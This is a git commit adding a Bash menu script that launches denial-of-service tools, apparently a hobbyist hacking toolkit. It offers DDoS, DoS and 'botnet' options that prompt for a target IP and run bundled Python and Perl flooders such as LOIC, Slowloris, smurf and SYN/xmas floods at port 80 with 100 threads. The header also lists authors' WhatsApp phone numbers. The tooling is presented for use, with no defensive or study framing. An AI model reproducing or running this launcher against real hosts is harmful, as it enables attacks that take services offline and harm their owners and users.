d9c2fdb86be1ff392eb368006567eb87969286e1
SL-Ourmine <82715187+11ourmine@users.noreply.github.com>
2021-04-18 10:47:40 +0530

    Add files via upload

---
+++ ddos.sh
@@ -0,0 +1,190 @@
+#Denial Of Service and ddos attack 
+# Author :- •⊱•Mrlinkerrorsystem
+# WhatsApp :- 081249281196
+#RECODE ©®
+#Modify by pinindu tharushan
+#whatsapp +94 70 280 1713
+#Upload by Cyber master
+#whatsapp +94 76 801 7981
+
+clear
+blue="$(printf '\033[34m')"
+green="$(printf '\033[32m')"
+purple="$(printf '\033[35m')"
+cyan="$(printf '\033[36m')"
+red="$(printf '\033[31m')"
+white="$(printf '\033[37m')"                                         
+yellow="$(printf '\033[33m')"
+clear
+echo
+echo $green"====================================================="
+echo $blue   "Code By •⊱•Mrlinkerrorsystem"
+echo $blue   "Modified By •⊱•Pinindu Tharushan "
+echo $blue   "Upload By •⊱•SL Cyber Master"
+echo $green"====================================================="
+echo $yellow "Cantact On Whatsapp"
+echo $white "+94 70 280 1713 :- Pinindu Tharushan"
+echo $white "+94 76 801 7981 :- SL Cyber Master"
+echo $green"====================================================="
+
+echo $red     "╭━━━╮"
+echo $purple "┃╭━╮┃"
+echo $red     "┃┃╱┃┣╮╭┳━┳╮╭┳┳━╮╭━━╮TM"
+echo $purple "┃┃╱┃┃┃┃┃╭┫╰╯┣┫╭╮┫┃━┫"
+echo $red     "┃╰━╯┃╰╯┃┃┃┃┃┃┃┃┃┃┃━┫"
+echo $purple" ╰━━━┻━━┻╯╰┻┻┻┻╯╰┻━━╯" echo $yellow "1.7v"
+
+echo $green"===================================================="
+echo $white"                  MENU                     "
+echo $green"===================================================="
+echo $red"[1].DDOS ATTACK.   #•⊱•Mrlinkerrorsystem"
+echo $red"[2].DoS ATTACK.    #081316577616"
+echo $red"[3].BOTNET ATTACK. #•⊱•Mrlinkerrorsystem"
+echo $red"[4].EXIT TOOL.     #    Selamat Menggunakan"
+echo $green"===================================================="
+echo $white "╭─"$yellow"•⊱•Mrlinkerrorsystemᵐᵒᵈ"
+read -p " ╰─> " pil
+
+#DDOS
+
+if [ $pil = 1 ] || [ $pil = 1 ]
+then
+clear
+toilet -f slant "LIST DDOS" -F metal
+echo
+echo $green"==================================================="
+echo $yellow"[1].LOIC"
+echo $yellow"[2].AMNESIA"
+echo $yellow"[3].PING OF DEADHT"
+echo $yellow"[4].POF ARMAGEDON LEVEL"
+echo $yellow"[5].LORIS"
+echo $yellow"[6].EXIT TOOL"
+echo $green"==================================================="
+echo $white "╭─"$yellow"•⊱•Mrlinkerrorsystemᵐᵒᵈ"
+read -p " ╰─> " ddos
+fi
+
+if [ $ddos = 1 ] || [ $ddos = 1 ]
+then
+clear
+python2 LO1C.py
+fi
+
+if [ $ddos = 2 ] || [ $ddos = 2 ]
+then
+clear
+perl Amnesia.pl
+fi
+
+if [ $ddos = 3 ] || [ $ddos = 3 ]
+then
+clear
+python2 TheSploit.py
+fi
+
+if [ $ddos = 4 ] || [ $ddos = 4 ]
+then
+clear
+python2 arma.py
+fi
+
+if [ $ddos = 5 ] || [ $ddos = 5 ]
+then
+clear
+python2 lor.py
+fi
+
+if [ $ddos = 6 ] || [ $ddos = 6 ]
+then
+clear
+exit
+fi
+
+#DOS
+
+
+
+if [ $pil = 2 ] || [ $pil = 2 ]
+then
+clear
+toilet -f slant "LIST DOS" -F metal
+echo
+echo $green"============================================="
+echo $yellow"[1].WIN(TERMUX)"
+echo $yellow"[2].SUMFR(PC)"
+echo $yellow"[3].UFOSYN(PC)"
+echo $yellow"[4].XMAS(PC)"
+echo $yellow"[5].ANDROMEDA(TERMUX)"
+echo $yellow"[6].EXIT TOOL"
+echo $green"============================================="
+echo $white "╭─"$yellow"•⊱•Mrlinkerrorsystemᵐᵒᵈ"
+read -p " ╰─> " dos
+fi
+
+
+
+if [ $dos = 1 ] || [ $dos = 1 ]
+then
+clear
+toilet -f slant "WIN"
+echo $red"MASUKAN IP TARGET"
+read -p "===>" win
+python2 win.32.64.NT.py -s$win -p80 -t100
+fi
+
+
+
+if [ $dos = 2 ] || [ $dos = 2 ]
+then
+clear
+python2 smurf.py
+fi
+
+if [ $dos = 3 ] || [ $dos = 3 ]
+then
+clear
+python2 ufosyn.py
+fi
+
+if [ $dos = 4 ] || [ $dos = 4 ]
+then
+clear
+python2 xmas.py
+fi
+
+if [ $dos = 5 ] || [ $dos = 5 ]
+then
+clear
+toilet -f slant "DROID RX" |lolcat
+echo $red"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python2 andromeda.py -s$ipt -p80 -t100
+fi
+
+if [ $dos = 6 ] || [ $dos = 6 ]
+then
+clear
+exit
+fi
+
+
+#BOTNET
+
+if [ $pil = 3 ] || [ pil = 3 ]
+then
+clear
+toilet -f slant " BOTNET" -F gay
+echo $red"MASUKAN IP TARGET"
+read -p "==>" bot
+python2 Botnet.py -s$bot -p80 -t100
+fi
+
+#exit
+
+if [ $pil = 4 ] || [ pil = 4 ]
+then
+clear
+exit
+fi
